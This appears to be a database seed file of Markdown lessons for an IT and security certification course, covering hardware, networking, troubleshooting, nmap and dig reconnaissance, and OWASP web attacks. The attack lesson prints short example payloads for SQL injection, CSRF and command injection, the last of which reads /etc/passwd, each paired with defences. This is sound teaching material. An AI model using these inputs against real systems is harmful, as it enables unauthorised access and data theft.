| Language | File Extension | Platform | Example |
|----------|---------------|----------|---------|
| **Batch** | `.bat` | Windows CMD | `echo Hello` / `for /f %%i in (file.txt) do echo %%i` |
| **PowerShell** | `.ps1` | Windows | `Get-Service \| Where-Object {$_.Status -eq "Running"}` |
| **Bash** | `.sh` | Linux/macOS | `for f in *.log; do echo "$f"; done` |
| **Python** | `.py` | Cross-platform | `import os; print(os.listdir("."))` |

You do not need to write scripts from scratch — you need to **recognise** what a script does and identify the language from its syntax.

## Key Takeaways

- Always use ESD protection when handling internal components.
- Never open a PSU.
- Document everything: tickets, changes, and resolutions.
- Change management = plan, test, approve, implement, document, rollback plan.
- Recognise basic scripting syntax for Bash, PowerShell, batch, and Python.
$md$, 25, 3),

('b0000000-0000-4000-8000-000000000015', 'Hardware Deep-Dive: Power, Storage, and Display',
 'Power supplies, storage technologies, display types, printers, and BIOS/UEFI for CompTIA A+ Core 1.',
$md$
# Hardware Deep-Dive: Power, Storage, and Display

## Objectives

By the end of this lesson you will be able to:

- Describe power supply specifications, connectors, and selection criteria.
- Compare storage technologies: HDD, SSD (SATA, NVMe, M.2), and RAID levels.
- Identify display technologies and connector types.
- Describe printer types and their maintenance.
- Explain BIOS/UEFI settings and their security relevance.

## Power Supply Units (PSU)

The PSU converts AC power from the wall to DC power for components. Key specifications:

| Specification | Details |
|--------------|---------|
| **Wattage** | Total power output (e.g. 500W, 750W). Must exceed total component draw. |
| **Efficiency rating** | 80 Plus (Bronze, Silver, Gold, Platinum, Titanium). Higher = less wasted as heat. |
| **Modular vs non-modular** | Modular: detachable cables (cleaner build). Non-modular: all cables fixed. |
| **Form factor** | ATX (standard desktop), SFX (small form factor). |

Common PSU connectors:

| Connector | Purpose |
|-----------|---------|
| 24-pin ATX | Motherboard main power |
| 4/8-pin EPS | CPU power |
| 6/8-pin PCIe | Graphics card power |
| SATA power | Storage drives, optical drives |
| Molex (4-pin) | Legacy devices, case fans |

## Storage Technologies

| Technology | Interface | Speed | Form Factor | Notes |
|-----------|-----------|-------|-------------|-------|
| **HDD** | SATA III | ~150 MB/s | 3.5" (desktop), 2.5" (laptop) | Spinning platters; cheap per GB; fragile |
| **SSD (SATA)** | SATA III | ~550 MB/s | 2.5" | No moving parts; faster than HDD; limited writes |
| **SSD (NVMe)** | PCIe (via M.2 slot) | 2,000–7,000 MB/s | M.2 2280 | Fastest; uses PCIe lanes directly |
| **eMMC** | Embedded | ~400 MB/s | Soldered | Budget laptops and tablets |

### RAID Levels

RAID (Redundant Array of Independent Disks) combines multiple drives:

| RAID | Min Disks | Description | Speed | Redundancy | Usable Capacity |
|------|-----------|-------------|-------|-----------|----------------|
| **0** | 2 | Striping — data split across disks | Fast | None — one disk fails, all data lost | 100% |
| **1** | 2 | Mirroring — identical copy | Normal | One disk can fail | 50% |
| **5** | 3 | Striping with distributed parity | Fast reads | One disk can fail | (n-1)/n |
| **10** | 4 | Mirror + Stripe (RAID 1+0) | Fast | One disk per mirror can fail | 50% |

## Display Technologies

| Technology | Description |
|-----------|-------------|
| **LCD (LED-backlit)** | Most common; uses liquid crystals with LED backlighting |
| **OLED** | Each pixel emits own light; perfect blacks; thinner; more expensive |
| **IPS** | LCD variant with wide viewing angles and accurate colour |
| **TN** | LCD variant; fast response time but poor viewing angles |
| **VA** | LCD variant; good contrast ratio; between IPS and TN |

Display connectors: **HDMI** (audio + video, most common), **DisplayPort** (high refresh rate, daisy-chaining), **USB-C/Thunderbolt** (video + data + power), **VGA** (legacy analogue, 15-pin D-sub), **DVI** (legacy digital/analogue).

## Printers

| Type | How It Works | Maintenance |
|------|-------------|-------------|
| **Laser** | Toner fused to paper by heat. Process: Processing → Charging → Exposing → Developing → Transferring → Fusing → Cleaning. | Replace toner cartridge, imaging drum, fuser. |
| **Inkjet** | Liquid ink sprayed onto paper. | Replace ink cartridges, clean print heads, calibrate. |
| **Thermal** | Heat-sensitive paper (receipts). | Replace paper roll. No ink needed. |
| **3D (FDM)** | Melts filament layer by layer. | Level build plate, replace filament, clean nozzle. |

## BIOS/UEFI Settings

BIOS (Basic Input/Output System) and UEFI (Unified Extensible Firmware Interface) initialise hardware before the OS loads. Access by pressing a key during POST (Del, F2, F10, or Esc depending on manufacturer).

Key settings:

| Setting | Purpose | Security Relevance |
|---------|---------|-------------------|
| **Boot order** | Which device boots first (SSD, USB, Network) | Disable USB boot to prevent unauthorised OS booting |
| **Secure Boot** | Only allows signed bootloaders | Prevents rootkits and bootkit malware |
| **TPM** | Trusted Platform Module — stores encryption keys | Required for BitLocker |
| **Supervisor/admin password** | Protects BIOS settings | Prevents unauthorised changes |
| **Boot password** | Required to boot the system | Physical access control |
| **Virtualisation (VT-x/AMD-V)** | Enables hardware virtualisation | Required for Hyper-V, VirtualBox |

## Key Takeaways

- PSU wattage must exceed total system draw; know the connector types.
- NVMe SSDs are 10–40x faster than HDDs; RAID 5 offers speed + redundancy.
- Know the laser printing process (Processing through Cleaning) for the A+ exam.
- Secure Boot and TPM are security-critical BIOS/UEFI settings.
$md$, 35, 4),

('b0000000-0000-4000-8000-000000000015', 'Reconnaissance Tools: nmap, dig, and whois',
 'Hands-on introduction to network reconnaissance tools used in the capstone project.',
$md$
# Reconnaissance Tools: nmap, dig, and whois

## Objectives

By the end of this lesson you will be able to:

- Explain what reconnaissance is and why it matters in cybersecurity.
- Use nmap to discover hosts, open ports, services, and operating systems.
- Use dig to query DNS records.
- Use whois to look up domain registration information.
- Understand the ethical and legal boundaries of scanning.

## What Is Reconnaissance?

Reconnaissance (recon) is the first phase of any security assessment. It involves gathering information about a target to understand its attack surface. There are two types:

- **Passive recon** — gathering information without directly touching the target (WHOIS lookups, DNS queries, OSINT from public sources).
- **Active recon** — sending packets to the target to discover what is running (port scanning, service detection).

**Legal note:** Never scan systems you do not own or have written permission to test. Unauthorised scanning is illegal in most jurisdictions. In this course we use `scanme.nmap.org`, which is explicitly provided by the nmap project for testing.

## nmap — Network Mapper

nmap is the most widely used network scanning tool. It is pre-installed on Kali Linux.

### Basic Scan

```
nmap scanme.nmap.org
```

This performs a TCP SYN scan of the 1,000 most common ports. Output shows which ports are **open**, **closed**, or **filtered** (blocked by a firewall).

### Service Version Detection (-sV)

```
nmap -sV scanme.nmap.org
```

This probes open ports to determine what software and version is running (e.g. "Apache httpd 2.4.7" or "OpenSSH 6.6.1p1"). Service versions are critical for identifying known vulnerabilities.

### Default Script Scan (-sC)

```
nmap -sC scanme.nmap.org
```

Runs nmap's default NSE (Nmap Scripting Engine) scripts against open ports. These scripts check for common misconfigurations, gather additional information (e.g. SSL certificate details, HTTP titles), and detect well-known vulnerabilities.

### OS Detection (-O)

```
sudo nmap -O scanme.nmap.org
```

Attempts to identify the target's operating system by analysing TCP/IP stack behaviour. Requires root/sudo because it uses raw packets.

### Combining Flags

```
sudo nmap -sV -sC -O scanme.nmap.org
```

Or use `-A` (aggressive) which combines `-sV`, `-sC`, `-O`, and traceroute:

```
sudo nmap -A scanme.nmap.org
```

### Reading nmap Output

```
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 6.6.1p1
80/tcp   open   http        Apache httpd 2.4.7
9929/tcp open   nping-echo  Nping echo
```

- **PORT** — port number and protocol.
- **STATE** — open (accepting connections), closed (reachable but no service), filtered (firewall blocking).
- **SERVICE** — the protocol nmap thinks is running.
- **VERSION** — the specific software version.

## dig — DNS Lookup

dig (Domain Information Groper) queries DNS servers for records. It is pre-installed on Kali.

### Common Queries

```
dig example.com              # A record (IPv4 address)
dig example.com AAAA         # IPv6 address
dig example.com MX           # Mail servers
dig example.com NS           # Name servers
dig example.com TXT          # TXT records (SPF, DKIM, etc.)
dig example.com ANY          # All available records
```

### Reading dig Output

The **ANSWER SECTION** shows the results:

```
;; ANSWER SECTION:
example.com.    86400   IN   A   93.184.216.34
```

This tells you: the domain `example.com` has an A record pointing to IP `93.184.216.34`, with a TTL (time to live) of 86,400 seconds (24 hours).

## whois — Domain Registration Lookup

whois queries the domain registrar for registration details.

```
whois example.com
```

Output includes: registrar name, creation date, expiry date, name servers, and sometimes registrant contact information (though many registrations now use privacy protection).

This is useful for:

- Identifying who owns a domain.
- Finding when a domain was registered (newly registered domains are suspicious).
- Discovering name servers (may reveal hosting provider).

## Ethical and Legal Boundaries

| Allowed | Not Allowed |
|---------|-------------|
| Scanning your own systems | Scanning any system without written permission |
| Scanning authorised test targets (scanme.nmap.org) | Scanning your employer's network without authorisation |
| Passive OSINT (whois, DNS, public records) | Using scan results to exploit vulnerabilities without permission |

## Key Takeaways

- nmap is the primary tool for active reconnaissance. Know the flags: `-sV` (versions), `-sC` (scripts), `-O` (OS), `-A` (aggressive).
- dig queries DNS for A, MX, NS, TXT, and other record types.
- whois reveals domain ownership and registration details.
- Always have written permission before scanning.
$md$, 30, 5);

-- ========== BH-FOUND-2: Module 4 — Routing, Switching, and Network Operations ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000024', 'Routing and Switching Fundamentals',
 'VLANs, STP, routing tables, static and dynamic routing protocols for Network+.',
$md$
# Routing and Switching Fundamentals

## Objectives

By the end of this lesson you will be able to:

- Explain how switches forward frames using MAC address tables.
- Describe VLANs, trunking (802.1Q), and their security benefits.
- Explain how routers forward packets using routing tables.
- Distinguish static routing from dynamic routing protocols (RIP, OSPF, BGP).
- Describe Spanning Tree Protocol (STP) and its purpose.

## Switching

A **switch** operates at Layer 2 (Data Link). It learns MAC addresses by examining the source address of incoming frames and records them in its **MAC address table** (also called CAM table). When a frame arrives, the switch looks up the destination MAC:

- **Known unicast** — forward to the specific port.
- **Unknown unicast** — flood to all ports except the source.
- **Broadcast** — flood to all ports in the VLAN.

### VLANs (Virtual LANs)

A VLAN logically segments a switch into separate broadcast domains without needing separate physical switches.

| Benefit | Explanation |
|---------|-------------|
| **Security** | Isolate sensitive traffic (e.g. finance VLAN separate from guest VLAN) |
| **Performance** | Reduce broadcast domain size — fewer devices receive broadcasts |
| **Management** | Group users logically regardless of physical location |

Each VLAN gets a VLAN ID (1–4094). VLAN 1 is the default. Ports are assigned to a VLAN (access port) or carry multiple VLANs (trunk port).

### 802.1Q Trunking

A **trunk** link carries traffic for multiple VLANs between switches (or between a switch and a router). The **802.1Q** standard inserts a 4-byte tag into the Ethernet frame header that identifies the VLAN. The switch at the other end reads the tag and forwards to the correct VLAN.

### Spanning Tree Protocol (STP / 802.1D)

When switches are connected in loops (for redundancy), frames can circulate endlessly — a **broadcast storm**. STP prevents this by:

1. Electing a **root bridge** (switch with the lowest bridge ID).
2. Calculating the shortest path from every switch to the root.
3. **Blocking** redundant ports so only one active path exists.
4. If the active path fails, STP **unblocks** a previously blocked port (convergence).

**RSTP (802.1w)** is a faster version that converges in seconds rather than the 30–50 seconds of original STP.

## Routing

A **router** operates at Layer 3 (Network). It forwards packets between different networks using a **routing table**. Each entry in the routing table contains:

- **Destination network** (e.g. 10.0.1.0/24)
- **Next hop** (IP of the next router) or **exit interface**
- **Metric** (cost — lower is preferred)

### Static vs Dynamic Routing

| | Static | Dynamic |
|-|--------|---------|
| **Configuration** | Manual — admin enters routes | Automatic — routers exchange routes |
| **Scalability** | Poor — every route must be added by hand | Good — routers discover new routes automatically |
| **Use case** | Small networks, default routes, specific overrides | Medium to large networks |
| **Overhead** | None | Routing protocol traffic uses some bandwidth |

### Dynamic Routing Protocols

| Protocol | Type | Algorithm | Scope | Metric |
|----------|------|-----------|-------|--------|
| **RIP** | Distance vector | Bellman-Ford | Small networks | Hop count (max 15) |
| **OSPF** | Link state | Dijkstra | Enterprise | Cost (based on bandwidth) |
| **EIGRP** | Hybrid | DUAL | Cisco networks | Composite (bandwidth, delay) |
| **BGP** | Path vector | Best path | Internet (between ISPs) | AS path, policies |

**Exam tip (Network+):** OSPF is the most commonly tested. Know that it uses areas (Area 0 is the backbone), calculates cost based on bandwidth, and converges faster than RIP. BGP is the protocol that routes traffic between autonomous systems on the internet.

### Default Gateway

The **default gateway** is the router that a device sends packets to when the destination is outside its local network. If your IP is 192.168.1.10/24 and the gateway is 192.168.1.1, any packet destined for an IP outside 192.168.1.0/24 goes to 192.168.1.1.

## Key Takeaways

- Switches use MAC tables; VLANs segment broadcast domains; STP prevents loops.
- Routers use routing tables; static routing is manual; dynamic routing uses protocols.
- OSPF (link state, cost-based) and BGP (internet routing) are the most important for Network+.
- 802.1Q trunking carries multiple VLANs over a single link.
$md$, 35, 1),

('b0000000-0000-4000-8000-000000000024', 'IPv6 and Network Address Translation',
 'IPv6 addressing, NAT/PAT operation, and transition mechanisms.',
$md$
# IPv6 and Network Address Translation

## Objectives

By the end of this lesson you will be able to:

- Describe IPv6 address format, types, and configuration methods.
- Explain why IPv6 was developed and how it differs from IPv4.
- Describe NAT and PAT and how they conserve IPv4 addresses.
- Identify IPv4-to-IPv6 transition mechanisms.

## Why IPv6?

IPv4 has approximately 4.3 billion addresses. With billions of devices connected, IPv4 addresses are exhausted. **NAT** (see below) extended IPv4's life by sharing one public IP among many private devices, but it introduces complexity. IPv6 provides 2^128 addresses — effectively unlimited.

## IPv6 Address Format

An IPv6 address is 128 bits, written as eight groups of four hexadecimal digits separated by colons:

```
2001:0db8:85a3:0000:0000:8a2e:0370:7334
```

**Shortening rules:**
- Drop leading zeros in each group: `0db8` → `db8`, `0000` → `0`.
- Replace one consecutive run of all-zero groups with `::` (only once): `2001:db8:85a3::8a2e:370:7334`.

### IPv6 Address Types

| Type | Prefix | Description |
|------|--------|-------------|
| **Global unicast** | `2000::/3` | Public routable addresses (like IPv4 public IPs) |
| **Link-local** | `fe80::/10` | Auto-configured; only valid on the local link (like 169.254.x.x in IPv4) |
| **Unique local** | `fc00::/7` | Private addresses (like 10.x.x.x / 192.168.x.x in IPv4) |
| **Multicast** | `ff00::/8` | One-to-many (replaces broadcast — IPv6 has no broadcast) |
| **Loopback** | `::1` | Localhost (like 127.0.0.1) |

### IPv6 Configuration Methods

- **SLAAC** (Stateless Address Autoconfiguration) — device generates its own address from the network prefix (advertised by the router) + its interface ID. No DHCP server needed.
- **DHCPv6** (Stateful) — a DHCP server assigns addresses, similar to IPv4 DHCP.
- **Static** — manually configured.

## NAT (Network Address Translation)

NAT allows devices with **private** IP addresses (10.x.x.x, 172.16-31.x.x, 192.168.x.x) to communicate with the internet using a single **public** IP address. The router translates between private and public addresses.

### NAT Types

| Type | Description |
|------|-------------|
| **Static NAT** | One private IP maps to one public IP (1:1). Used for servers. |
| **Dynamic NAT** | Pool of public IPs shared among private IPs (many:many). |
| **PAT (Port Address Translation)** | Many private IPs share one public IP by using different port numbers (many:1). Also called NAT overload. **Most common type.** |

### How PAT Works

When device 192.168.1.10 sends a request to a web server, the router:
1. Replaces the source IP with the public IP (e.g. 203.0.113.5).
2. Assigns a unique source port (e.g. 50001).
3. Records the mapping: 192.168.1.10:45678 ↔ 203.0.113.5:50001.
4. When the response returns to 203.0.113.5:50001, the router translates it back to 192.168.1.10:45678.

## IPv4-to-IPv6 Transition

| Mechanism | Description |
|-----------|-------------|
| **Dual stack** | Device runs both IPv4 and IPv6 simultaneously. Most common approach. |
| **Tunneling** | IPv6 packets encapsulated inside IPv4 packets to cross IPv4-only networks (e.g. 6to4, Teredo, ISATAP). |
| **NAT64** | Translates between IPv6 and IPv4 at the network boundary. |

## Key Takeaways

- IPv6 uses 128-bit addresses written in hex; know shortening rules and address types.
- IPv6 has no broadcast — it uses multicast instead.
- PAT (NAT overload) is the most common NAT type — shares one public IP using port numbers.
- Dual stack is the primary IPv4-to-IPv6 transition strategy.
$md$, 30, 2),

('b0000000-0000-4000-8000-000000000024', 'Network Troubleshooting Tools and Methodology',
 'Command-line diagnostic tools and systematic troubleshooting for Network+.',
$md$
# Network Troubleshooting Tools and Methodology

## Objectives

By the end of this lesson you will be able to:

- Apply a systematic network troubleshooting methodology.
- Use common command-line network tools: ping, tracert/traceroute, ipconfig/ifconfig, nslookup, netstat, arp, pathping.
- Diagnose common network problems using these tools.

## Troubleshooting Methodology (CompTIA 7-Step)

1. **Identify the problem** — gather information: what changed? Who is affected? When did it start? Can you reproduce it?
2. **Establish a theory of probable cause** — based on symptoms, form a hypothesis. Start with the simplest explanation.
3. **Test the theory** — verify your hypothesis. If wrong, form a new theory.
4. **Establish a plan of action** — plan the fix and consider impact.
5. **Implement the solution** — apply the fix (or escalate if beyond your scope).
6. **Verify full system functionality** — confirm the fix works and nothing else broke.
7. **Document** — record the problem, cause, and solution.

## Command-Line Network Tools

### ping

Tests basic connectivity by sending ICMP echo requests.

```
ping 8.8.8.8           # Test by IP (bypasses DNS)
ping google.com         # Test by name (tests DNS + connectivity)
ping -t 192.168.1.1     # Continuous ping (Windows; Ctrl+C to stop)
```

If `ping 8.8.8.8` works but `ping google.com` fails → DNS problem.
If both fail → network connectivity problem.

### tracert / traceroute

Shows every hop (router) between you and the destination.

```
tracert google.com      # Windows
traceroute google.com   # Linux
```

Look for: high latency at a specific hop (bottleneck), timeouts (* * *) indicating a router that blocks ICMP or is unreachable.

### ipconfig / ifconfig / ip

Show and manage IP configuration.

```
ipconfig                # Windows — show IP, subnet, gateway
ipconfig /all           # Windows — show full details (MAC, DHCP, DNS)
ipconfig /release       # Release DHCP lease
ipconfig /renew         # Request new DHCP lease
ipconfig /flushdns      # Clear DNS cache
ip addr                 # Linux — show IP addresses
ip route                # Linux — show routing table
```

### nslookup / dig

Query DNS servers.

```
nslookup example.com    # Quick DNS lookup (Windows/Linux)
dig example.com         # Detailed DNS lookup (Linux)
```

### netstat / ss

Show active network connections and listening ports.

```
netstat -an             # Windows/Linux — all connections, numeric
netstat -b              # Windows — show which process owns each connection
ss -tuln                # Linux — TCP/UDP listening sockets, numeric
```

### arp

Show and manage the ARP cache (IP-to-MAC mappings).

```
arp -a                  # Show ARP cache
```

Useful for detecting **ARP poisoning** — if two IPs map to the same MAC, someone may be performing a man-in-the-middle attack.

### pathping (Windows only)

Combines ping and tracert. Sends packets over a period and reports packet loss at each hop.

```
pathping google.com
```

## Common Network Problems and Diagnosis

| Symptom | Likely Cause | Tool to Diagnose |
|---------|-------------|-----------------|
| No connectivity at all | Cable unplugged, NIC disabled, DHCP failure | Check link light; `ipconfig` for 169.254.x.x (APIPA = no DHCP) |
| Can ping IP but not hostname | DNS failure | `nslookup`; check DNS server setting |
| Slow network | Congestion, duplex mismatch, bandwidth saturation | `pathping` for packet loss; `netstat` for connection count |
| Intermittent connectivity | Loose cable, wireless interference, IP conflict | Check cable connections; `ping -t` for pattern; Event Viewer for IP conflict |
| Can reach local but not internet | Default gateway wrong or unreachable | `ipconfig` to check gateway; `ping` gateway; `tracert` |

## Key Takeaways

- Always follow the 7-step methodology — start with the simplest explanation.
- ping tests connectivity; tracert finds where it breaks; ipconfig shows your configuration.
- If ping by IP works but by name fails = DNS issue.
- APIPA address (169.254.x.x) = DHCP server unreachable.
$md$, 30, 3),

('b0000000-0000-4000-8000-000000000024', 'Network Operations: SNMP, Syslog, and Documentation',
 'Network monitoring protocols, logging infrastructure, and documentation standards.',
$md$
# Network Operations: SNMP, Syslog, and Documentation

## Objectives

By the end of this lesson you will be able to:

- Describe SNMP and its role in network monitoring.
- Explain syslog and centralised logging.
- Describe NTP and why time synchronisation matters.
- Identify key network documentation types and best practices.

## SNMP (Simple Network Management Protocol)

SNMP allows network management systems to monitor and manage devices (routers, switches, firewalls, servers, printers).

### Components

- **SNMP Manager** (monitoring server, e.g. Nagios, PRTG, Zabbix) — polls devices and receives alerts.
- **SNMP Agent** — software on each managed device that responds to queries and sends traps.
- **MIB (Management Information Base)** — database of objects (OIDs) the agent can report (CPU usage, interface status, error counts, uptime).

### SNMP Versions

| Version | Authentication | Encryption | Notes |
|---------|---------------|------------|-------|
| **v1** | Community string (plaintext) | None | Insecure; legacy |
| **v2c** | Community string (plaintext) | None | Improved performance; still insecure |
| **v3** | Username + password (USM) | Yes (DES/AES) | **Recommended** — only version with encryption |

**Exam tip:** Always use SNMPv3 in production. Community strings in v1/v2c are sent in cleartext.

## Syslog

Syslog is a standard for sending log messages from devices to a centralised **syslog server**. Uses UDP port 514 (or TCP 514 / TLS 6514 for reliable/secure transport).

### Syslog Severity Levels

| Level | Keyword | Description |
|-------|---------|-------------|
| 0 | Emergency | System is unusable |
| 1 | Alert | Immediate action needed |
| 2 | Critical | Critical conditions |
| 3 | Error | Error conditions |
| 4 | Warning | Warning conditions |
| 5 | Notice | Normal but significant |
| 6 | Informational | Informational messages |
| 7 | Debug | Debug-level messages |

Centralised logging is essential for: correlation (see events across devices), compliance (audit trail), incident investigation, and long-term storage.

## NTP (Network Time Protocol)

NTP synchronises clocks across network devices. Uses UDP port 123.

Why it matters:
- **Log correlation** — if devices have different times, correlating events across logs is impossible.
- **Authentication** — Kerberos requires clocks to be within 5 minutes; certificate validity depends on correct time.
- **Compliance** — regulations require accurate timestamps.

NTP uses a hierarchy of **stratum** levels: Stratum 0 (atomic clock), Stratum 1 (directly connected to Stratum 0), Stratum 2, etc.

## Network Documentation

| Document | Purpose | Content |
|----------|---------|---------|
| **Network diagram** | Visual map of topology | Devices, connections, IP ranges, VLANs, WAN links |
| **Wiring diagram** | Physical cable infrastructure | Patch panel connections, cable runs, labels |
| **IP address plan (IPAM)** | Track IP allocation | Subnets, DHCP ranges, static assignments, reservations |
| **Baseline** | Normal performance metrics | Average bandwidth, latency, CPU/memory usage during normal operations |
| **Change log** | Record of all changes | What changed, when, by whom, rollback plan |
| **Configuration backup** | Copy of device configs | Router/switch/firewall running and startup configs |

### Performance Baselines

A baseline records what "normal" looks like. Without a baseline, you cannot determine if current performance is abnormal. Capture metrics over 7–30 days: bandwidth utilisation, latency, packet loss, CPU/memory on critical devices.

## Key Takeaways

- SNMPv3 is the only secure version — v1/v2c send community strings in cleartext.
- Syslog centralises logs; severity 0 (Emergency) is most critical, 7 (Debug) is least.
- NTP keeps clocks synchronised — critical for log correlation, authentication, and compliance.
- Always maintain network diagrams, IP plans, baselines, and configuration backups.
$md$, 25, 4),

('b0000000-0000-4000-8000-000000000024', 'Network Analysis Tools: ss and Wireshark',
 'Hands-on introduction to socket statistics and Wireshark packet capture for the capstone.',
$md$
# Network Analysis Tools: ss and Wireshark

## Objectives

By the end of this lesson you will be able to:

- Use ss to list listening and active network connections on Linux.
- Capture live network traffic in Wireshark.
- Apply display filters to isolate specific traffic.
- Use Wireshark's Statistics views (Protocol Hierarchy, Conversations, Endpoints).
- Analyse a PCAP file to extract useful information.

## ss — Socket Statistics

`ss` is the modern replacement for `netstat` on Linux. It shows active connections and listening sockets.

### Common Usage

```
ss -tuln          # TCP and UDP, listening, numeric (no DNS resolution)
ss -tulnp         # Same but show the process name (requires sudo)
ss -s             # Summary statistics
ss -t state established  # Show only established TCP connections
```

### Reading ss Output

```
State    Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
LISTEN   0       128     0.0.0.0:22          0.0.0.0:*          sshd
LISTEN   0       128     0.0.0.0:80          0.0.0.0:*          apache2
ESTAB    0       0       10.0.0.5:22         10.0.0.1:54321     sshd
```

- `0.0.0.0:22` means SSH is listening on all interfaces on port 22.
- `ESTAB` means there is an active connection from 10.0.0.1 to the SSH service.

**Security use:** Identify unexpected listening services (indicators of compromise) or connections to suspicious IPs.

## Wireshark — Packet Capture and Analysis

Wireshark is a graphical network protocol analyser. It captures packets from a network interface and lets you inspect them in detail. Pre-installed on Kali Linux.

### Starting a Capture

1. Open Wireshark.
2. Select a network interface (e.g. `eth0` for wired, `wlan0` for wireless).
3. Click the blue shark fin button to start capturing.
4. Generate some traffic (e.g. browse a website).
5. Click the red square to stop.

### Display Filters

Display filters let you show only the traffic you care about:

| Filter | Shows |
|--------|-------|
| `dns` | DNS queries and responses |
| `http` | HTTP traffic |
| `tcp.port == 443` | HTTPS traffic |
| `ip.addr == 10.0.0.1` | Traffic to/from a specific IP |
| `tcp.flags.syn == 1` | TCP SYN packets (connection attempts) |
| `http.request` | HTTP requests only |
| `!(arp or dns)` | Everything except ARP and DNS (reduce noise) |

Type the filter in the filter bar and press Enter. Green = valid filter. Red = syntax error.

### Protocol Hierarchy

**Statistics → Protocol Hierarchy** shows a breakdown of all protocols in the capture by percentage. This gives a quick overview: mostly HTTP? Lots of DNS? Unexpected protocols?

### Conversations and Endpoints

- **Statistics → Conversations** — shows all communication pairs (who is talking to whom). Sort by bytes to find the largest data transfers.
- **Statistics → Endpoints** — shows all unique hosts. Sort by packets or bytes.

### Follow TCP Stream

Right-click a packet → **Follow → TCP Stream**. This reconstructs the entire conversation between two hosts, showing the data exchanged in readable format. Extremely useful for analysing HTTP requests, seeing what data was transferred, and identifying suspicious content.

### Analysing a PCAP File

A PCAP (Packet Capture) file is a saved capture. Open it with: **File → Open** or `wireshark sample.pcap` from the command line.

Analysis workflow:
1. **Statistics → Protocol Hierarchy** — what protocols are present?
2. **Statistics → Conversations** — who is the most active?
3. **Apply filters** — zoom in on interesting traffic (e.g. `http.request`).
4. **Follow TCP streams** — read the actual data exchanged.
5. **Note anomalies** — unusual ports, unexpected protocols, large transfers, connections to suspicious IPs.

## Key Takeaways

- `ss -tuln` is the fastest way to see what is listening on a Linux system.
- Wireshark captures and decodes network traffic at the packet level.
- Display filters are essential — learn the common ones (dns, http, tcp.port, ip.addr).
- Protocol Hierarchy and Conversations views give quick situational awareness.
- Follow TCP Stream reconstructs full conversations for analysis.
$md$, 35, 5);

-- ========== BH-CYBER-2: Module 5 — Application Security and Automation ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000035', 'Application Attacks and the OWASP Top 10',
 'SQL injection, XSS, CSRF, command injection, and the OWASP Top 10 for Security+.',
$md$
# Application Attacks and the OWASP Top 10

## Objectives

By the end of this lesson you will be able to:

- Explain how common web application attacks work: SQL injection, XSS, CSRF, and command injection.
- Describe the OWASP Top 10 and its purpose.
- Identify prevention techniques for each attack type.

## Why Application Security Matters

Web applications handle sensitive data (credentials, payment info, personal data). Unlike network attacks, application attacks target the **logic** of the application itself. If the code is vulnerable, firewalls and encryption cannot help — the attacker uses the application's own features against it.

## SQL Injection (SQLi)

SQL injection occurs when user input is inserted directly into a SQL query without sanitisation.

**How it works:** A login form sends username and password to the server, which builds a query:

```sql
SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
```

If an attacker enters `' OR '1'='1` as the username:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
```

Since `'1'='1'` is always true, the query returns all users — the attacker bypasses authentication.

**Impact:** Data theft, authentication bypass, data modification, database destruction (`DROP TABLE`).

**Prevention:**
- **Parameterised queries** (prepared statements) — the database treats input as data, not code.
- **Input validation** — reject unexpected characters.
- **Least privilege** — database accounts used by the app should have minimal permissions.

## Cross-Site Scripting (XSS)

XSS occurs when an attacker injects malicious JavaScript into a web page viewed by other users.

**Types:**

| Type | Description | Example |
|------|-------------|---------|
| **Reflected** | Script is in a URL parameter; reflected back in the page | Phishing link with script in the URL |
| **Stored** | Script is saved in the database (e.g. comment field); executed for every visitor | Forum post containing `<script>` tag |
| **DOM-based** | Script manipulates the page's DOM on the client side | JavaScript reads URL fragment and writes it to the page |

**Impact:** Cookie theft (session hijacking), keylogging, defacement, redirects to malicious sites.

**Prevention:**
- **Output encoding** — convert special characters (`<`, `>`, `"`, `'`) to HTML entities.
- **Content Security Policy (CSP)** — HTTP header that restricts which scripts can execute.
- **Input validation** — reject HTML/script tags in user input.

## Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in user's browser into making an unwanted request to a web application.

**How it works:** A user is logged in to their bank. They visit a malicious website that contains a hidden form:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

The browser sends the request with the user's authentication cookie — the bank processes the transfer.

**Prevention:**
- **Anti-CSRF tokens** — unique token in each form that the server validates.
- **SameSite cookie attribute** — prevents cookies from being sent with cross-site requests.

## Command Injection

Command injection occurs when user input is passed to a system command.

**Example:** A web app has a "ping" feature:

```python
os.system("ping -c 4 " + user_input)
```

If the attacker enters `; cat /etc/passwd`, the server executes:

```
ping -c 4 ; cat /etc/passwd
```

The semicolon separates commands — the server pings, then outputs the password file.

**Prevention:** Never pass user input to system commands. If unavoidable, use whitelists and parameterised APIs.

## The OWASP Top 10 (2021)

The Open Web Application Security Project publishes the ten most critical web application security risks:

| # | Risk | Description |
|---|------|-------------|
| A01 | **Broken Access Control** | Users can act outside their permissions |
| A02 | **Cryptographic Failures** | Sensitive data exposed due to weak/missing encryption |
| A03 | **Injection** | SQLi, command injection, LDAP injection |
| A04 | **Insecure Design** | Missing security controls in the design phase |
| A05 | **Security Misconfiguration** | Default credentials, unnecessary features, missing patches |
| A06 | **Vulnerable and Outdated Components** | Using libraries with known vulnerabilities |
| A07 | **Identification and Authentication Failures** | Weak passwords, no MFA, session issues |
| A08 | **Software and Data Integrity Failures** | Insecure CI/CD, unsigned updates |
| A09 | **Security Logging and Monitoring Failures** | No logging, no alerting on suspicious activity |
| A10 | **Server-Side Request Forgery (SSRF)** | App fetches a URL provided by the attacker |

## Key Takeaways

- SQLi exploits unsanitised input in database queries — prevent with parameterised queries.
- XSS injects malicious JavaScript — prevent with output encoding and CSP.
- CSRF tricks browsers into making unauthorised requests — prevent with anti-CSRF tokens.
- Command injection passes input to system commands — never pass user input to OS commands.
- The OWASP Top 10 is the industry standard for web application risk awareness.
$md$, 35, 1),

('b0000000-0000-4000-8000-000000000035', 'Automation and Scripting for Security',
 'Using Python, PowerShell, and Bash for security automation — a key Security+ SY0-701 domain.',
$md$
# Automation and Scripting for Security

## Objectives

By the end of this lesson you will be able to:

- Explain why automation is critical in modern security operations.
- Identify common security automation use cases.
